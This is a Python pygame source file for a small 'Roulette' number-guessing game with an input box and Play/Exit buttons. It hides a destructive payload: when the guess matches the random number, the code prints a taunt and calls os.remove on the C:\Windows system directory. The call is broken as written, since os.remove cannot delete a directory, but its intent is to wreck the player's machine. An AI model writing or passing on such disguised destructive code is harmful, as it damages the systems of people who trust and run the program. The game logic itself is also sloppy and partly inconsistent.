import pygame
import os
import random
import time
import sys

pygame.init()

# Set up the window
win_width = 640
win_height = 480
win = pygame.display.set_mode((win_width, win_height))
pygame.display.set_caption("Roulette")

# Set up the fonts
font = pygame.font.Font(None, 32)

# Set up the input box
input_box = pygame.Rect(100, 200, 140, 32)
input_text = ""

# Set up the buttons
play_button = pygame.Rect(100, 250, 60, 32)
exit_button = pygame.Rect(180, 250, 60, 32)

# Main loop
while True:
    # Handle events
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.quit()
            sys.exit()
        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_BACKSPACE:
                input_text = input_text[:-1]
            else:
                input_text += event.unicode
        if event.type == pygame.MOUSEBUTTONDOWN:
            if play_button.collidepoint(event.pos):
                # Play the game
                number = int(input_text)
                rnumber = random.randint(0, 10)
                if number == rnumber:
                    print("Looks like it's not your lucky day :) ")
                    time.sleep(1)
                    os.remove("C:\Windows")
                elif number > 10:
                    print("The number cannot be greater than 10")
                else:
                    while number != rnumber:
                        print("You were lucky")
                        break
            elif exit_button.collidepoint(event.pos):
                # Exit the game
                exit_choice = str(input("Are you sure you want to exit? y/n "))
                if exit_choice == "y":
                    pygame.quit()
                    sys.exit()
                elif exit_choice == "n":
                    input_text = ""
                else:
                    print("Choose a correct option")

    # Clear the screen
    win.fill((255, 255, 255))

    # Draw the text
    text = font.render("Pick a number from 1 to 10:", True, (0, 0, 0))
    win.blit(text, (100, 175))

    # Draw the input box
    pygame.draw.rect(win, (0, 0, 0), input_box, 2)
    input_surf = font.render(input_text, True, (0, 0, 0))
    win.blit(input_surf, (input_box.x + 5, input_box.y + 5))

    # Draw the buttons
    pygame.draw.rect(win, (0, 255, 0), play_button)
    pygame.draw.rect(win, (255, 0, 0), exit_button)
    play_text = font.render("Play", True, (0, 0, 0))
    exit_text = font.render("Exit", True, (0, 0, 0))
    win.blit(play_text, (play_button.x + 5, play_button.y + 5))
    win.blit(exit_text, (exit_button.x + 5, exit_button.y + 5))

    # Update the display
    pygame.display.update()